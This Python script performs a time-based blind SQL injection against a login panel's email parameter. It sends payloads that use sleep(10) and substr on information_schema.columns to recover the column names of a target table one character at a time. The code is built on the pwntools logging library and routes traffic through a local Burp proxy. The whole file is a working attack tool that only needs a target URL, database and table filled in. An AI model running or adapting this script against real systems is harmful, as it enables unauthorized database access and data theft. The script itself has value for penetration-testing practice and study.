#!/usr/bin/python3

import signal
import sys 
import requests
import time
from urllib3.exceptions import InsecureRequestWarning
from pwn import *

# GLOBAL VARIABLES

url = '' # Change this to the vulnerable login panel
burp = {'http': 'http://127.0.0.1:8080'}
s = r'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890,.-;:_{}[]!"#$%&/()='
result = ''
database = '' # Change this to the database
table = '' # Change this to the table to get the columns

######### Note ##############

# Change the data_post for the correct parameters of the login panel

# Disable warnings because of an autosigned certificate
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

#Ctrl + C

def def_handler(sig, frame):
    print("[-] Exiting...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Send Payload Function

def check(payload):
    data_post = {
        'email': '%s' % payload,
        'password': 'loquesea'
    }

    time_start = time.time()
    content = requests.post(url, data=data_post, verify=False)
    time_end = time.time()

    if time_end - time_start > 10:
        return 1
  
  
p2 = log.progress("Payload")

for j in range(0, 5):
    p1 = log.progress("Column [%d]" % j)
    for i in range(1, 10):
        for c in s:
            payload = "' or if(substr((select column_name from information_schema.columns where table_schema='%s' and table_name='%s' limit %d,1),%d,1)='%c',sleep(10),1)-- -" % (database, table, j, i, c)
          
            p2.status("%s" % payload)

            if check(payload):
                result += c
                p1.status("%s" % result)
                break
    p1 = log.success('%s' % result)
    result = ''

